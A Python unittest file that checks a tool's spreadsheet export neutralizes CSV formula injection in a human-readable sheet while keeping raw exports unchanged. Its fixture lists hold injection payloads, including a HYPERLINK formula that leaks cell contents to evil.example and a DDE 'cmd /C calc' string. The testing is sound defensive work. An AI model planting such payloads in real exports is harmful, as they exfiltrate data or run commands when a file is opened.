"""Lane 05 tests for A07 export safety.

Adversarial spreadsheet fixtures from the acceptance list: leading = + - @,
tabs/newlines, delimiters, quotes, Arabic, multiline. The raw machine
formats must keep ORIGINAL text; the separate human sheet must neutralize.
"""
import csv
import io
import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

LANE = Path(__file__).resolve().parents[1]
def _find_run_root(start):
    # Integration-tree repair by Chat 07 (2026-09-07): lanes sit at
    # <run>/workers/NN but integration at <run>/integration, so a fixed
    # parents[] hop cannot serve both. Walk up to the contracts dir instead
    # (same pattern as test_lane04_provider_contract).
    for parent in [start] + list(start.parents):
        if (parent / "contracts" / "fixtures").is_dir():
            return parent
    return start.parents[3]

RUN = _find_run_root(Path(__file__).resolve().parent)
FIX = RUN / "contracts" / "fixtures"
sys.path.insert(0, str(LANE / "scripts"))

import export_safety  # noqa: E402
import group_monitor as gm  # noqa: E402

HOSTILE_CELLS = [
    "=HYPERLINK(\"https://evil.example/?leak=\"&A1,\"click\")",
    "=1+2",
    "+2+5+cmd|' /C calc'!A0",
    "-2+3",
    "@SUM(1,9)",
    "\t=tabbed formula",
    "\r=carriage formula",
    "=قائمة عربية",
    "line one\n=second line formula",
    'quoted "cells", with, delimiters; and more',
    "عنوان عربي عادي",
    "плита =unicode then formula",  # trigger NOT at index 0 -> untouched
    "normal text",
    "＝fullwidth equals",
    "\n=linefeed lead",
]


class NeutralizeUnit(unittest.TestCase):
    def test_trigger_set_covers_contract_minimum(self):
        # c1 freezes the minimum; the implementation may only ever grow it.
        self.assertTrue(set("=+-@\t\r") <= set(export_safety.FORMULA_TRIGGERS))
        # OWASP additions actually present:
        self.assertIn("\n", export_safety.FORMULA_TRIGGERS)
        self.assertIn("＝", export_safety.FORMULA_TRIGGERS)

    def test_leading_triggers_get_apostrophe(self):
        for cell in HOSTILE_CELLS:
            safe = export_safety.neutralize_cell(cell)
            if cell[0] in export_safety.FORMULA_TRIGGERS:
                self.assertEqual(safe, "'" + cell)
                self.assertEqual(export_safety.unneutralize_cell(safe), cell)
            else:
                self.assertEqual(safe, cell)

    def test_numbers_and_none_pass_through(self):
        for value in (0, 3, -7, 2.5, -1.5, None, True, False):
            self.assertIs(export_safety.neutralize_cell(value), value)

    def test_empty_string_untouched(self):
        self.assertEqual(export_safety.neutralize_cell(""), "")

    def test_internal_newlines_and_quotes_survive_roundtrip(self):
        rows = [{"a": "line1\nline2\r\n=not first", "b": 'say "hi", ok'}]
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "sheet.csv"
            export_safety.write_human_sheet_csv(path, ["a", "b"], rows)
            with open(path, encoding="utf-8-sig", newline="") as handle:
                parsed = list(csv.reader(handle))
        self.assertEqual(parsed[1][0], "line1\nline2\r\n=not first")
        self.assertEqual(parsed[1][1], 'say "hi", ok')

    def test_writer_reports_and_bom(self):
        rows = [{"a": "=x", "b": "ok"}, {"a": "fine", "b": "@dm"}]
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "sheet.csv"
            summary = export_safety.write_human_sheet_csv(path, ["a", "b"], rows)
            raw = path.read_bytes()
        self.assertEqual(summary["rows"], 2)
        self.assertEqual(summary["neutralized_cells"], 2)
        self.assertTrue(raw.startswith(b"\xef\xbb\xbf"), "utf-8-sig BOM expected")

    def test_self_check_flags_unsafe_and_exempts_numerals(self):
        problems = export_safety.self_check(
            [], ["a", "b", "c"], [["=bad", "-1.5", "ok"]])
        self.assertEqual(len(problems), 1)
        self.assertIn("'='", problems[0])


class ExportIntegration(unittest.TestCase):
    """export_relevant writes raw formats with ORIGINAL text and the separate
    neutralized human sheet, from the same rows."""

    def setUp(self):
        self.tempdir = tempfile.TemporaryDirectory()
        self.old_data_dir = gm.DATA_DIR
        gm.DATA_DIR = Path(self.tempdir.name) / "outputs"
        self.conn = gm.connect_db(Path(self.tempdir.name) / "monitor.sqlite3")
        self.profile = {
            "conversation": {"id": "group", "auth_account": "owner"},
            "owners": [{"username": "owner", "sender_id": "42"}],
            "selection": {
                "minimum_score": 3,
                "ai_weight": 4,
                "ai_terms": ["ai"],
                "project_areas": {
                    "marketplace": {
                        "label": "Marketplace",
                        "description": "Seller operations",
                        "weight": 3,
                        "keywords": ["noon"],
                    }
                },
            },
        }

    def tearDown(self):
        self.conn.close()
        gm.DATA_DIR = self.old_data_dir
        self.tempdir.cleanup()

    def _insert(self, resource_id, message_id, text, title, author):
        now = gm.utc_now()
        self.conn.execute(
            "INSERT INTO messages(message_id, conversation_id, sent_at_ms, sender_id,"
            " is_owner, text, urls_json, captured_at)"
            " VALUES(?, 'group', ?, '42', 1, ?, '[]', ?)",
            (message_id, 1_700_000_000_000 + int(message_id), text, now),
        )
        self.conn.execute(
            "INSERT INTO resources(resource_id, kind, canonical_url, tweet_id,"
            " first_message_id, last_message_id, sender_id, source_text, status,"
            " title, author, content_text, score, project_areas_json, reasons_json,"
            " decision_source, first_seen_at, updated_at)"
            " VALUES(?, 'tweet', ?, ?, ?, ?, '42', ?, 'relevant', ?, ?, ?, 3,"
            " '[\"marketplace\"]', '[\"fits\"]', 'rules', ?, ?)",
            (
                resource_id,
                "https://x.com/i/status/" + resource_id.split(":")[1],
                resource_id.split(":")[1],
                message_id, message_id,
                text, title, author, text, now, now,
            ),
        )
        self.conn.execute(
            "INSERT INTO message_resources(message_id, resource_id) VALUES(?, ?)",
            (message_id, resource_id),
        )
        self.conn.commit()

    def test_raw_stays_raw_and_sheet_is_neutralized(self):
        hostile_title = "=HYPERLINK(\"https://evil.example\",\"open me\")"
        hostile_text = "+2+5+cmd|' /C calc'!A0 مع نص عربي\nsecond line\t=deep"
        hostile_author = "@SUM(1,9)"
        self._insert("tweet:9001", "901", hostile_text, hostile_title, hostile_author)
        self._insert("tweet:9002", "902", "-2+3 starts with minus", "\t=tab lead", "-lead")

        gm.export_relevant(self.conn, self.profile)

        raw_csv = (gm.DATA_DIR / "relevant.csv").read_text(encoding="utf-8")
        raw_rows = list(csv.DictReader(io.StringIO(raw_csv)))
        by_id = {row["resource_id"]: row for row in raw_rows}
        self.assertEqual(by_id["tweet:9001"]["title"], hostile_title)
        self.assertEqual(by_id["tweet:9001"]["text"], hostile_text)
        self.assertEqual(by_id["tweet:9001"]["author"], hostile_author)
        self.assertEqual(by_id["tweet:9002"]["title"], "\t=tab lead")
        self.assertFalse(raw_csv.startswith("﻿"), "raw export must have no BOM")

        jsonl = (gm.DATA_DIR / "relevant.jsonl").read_text(encoding="utf-8")
        records = [json.loads(line) for line in jsonl.splitlines()]
        titles = {record["resource_id"]: record["title"] for record in records}
        self.assertEqual(titles["tweet:9001"], hostile_title)

        sheet_path = gm.DATA_DIR / export_safety.HUMAN_SHEET_NAME
        self.assertTrue(sheet_path.exists())
        with open(sheet_path, encoding="utf-8-sig", newline="") as handle:
            parsed = list(csv.reader(handle))
        header, data = parsed[0], parsed[1:]

        frozen = json.loads((FIX / "c7-csv-columns.json").read_text())["relevant_csv"]
        self.assertEqual(header, frozen, "human sheet keeps the frozen column set")

        problems = export_safety.self_check([], header, data)
        self.assertEqual(problems, [], problems)

        sheet_by_id = {row[0]: dict(zip(header, row)) for row in data}
        self.assertEqual(sheet_by_id["tweet:9001"]["title"], "'" + hostile_title)
        self.assertEqual(sheet_by_id["tweet:9001"]["author"], "'" + hostile_author)
        self.assertEqual(sheet_by_id["tweet:9002"]["title"], "'\t=tab lead")
        # Arabic content is intact after the BOM round-trip.
        self.assertIn("مع نص عربي", sheet_by_id["tweet:9001"]["text"])
        # Recoverability: stripping the one apostrophe restores the original.
        self.assertEqual(
            export_safety.unneutralize_cell(sheet_by_id["tweet:9001"]["title"]),
            hostile_title,
        )
        # Numeric column stays numeric-looking (no apostrophe).
        self.assertEqual(sheet_by_id["tweet:9001"]["score"], "3")

    def test_sheet_row_count_matches_raw(self):
        for index in range(3):
            self._insert("tweet:91{:02d}".format(index), str(910 + index),
                         "text {}".format(index), "title", "author")
        gm.export_relevant(self.conn, self.profile)
        raw = list(csv.reader(io.StringIO(
            (gm.DATA_DIR / "relevant.csv").read_text(encoding="utf-8"))))
        sheet = list(csv.reader(io.StringIO(
            (gm.DATA_DIR / export_safety.HUMAN_SHEET_NAME).read_text(encoding="utf-8-sig"))))
        self.assertEqual(len(raw), len(sheet))

    def test_all_resources_csv_untouched_by_helper(self):
        self._insert("tweet:9201", "920", "=formula text", "=title", "author")
        gm.export_relevant(self.conn, self.profile)
        audit = (gm.DATA_DIR / "all-resources.csv").read_text(encoding="utf-8")
        rows = list(csv.DictReader(io.StringIO(audit)))
        target = [row for row in rows if row["resource_id"] == "tweet:9201"][0]
        self.assertEqual(target["title"], "=title")


if __name__ == "__main__":
    unittest.main()
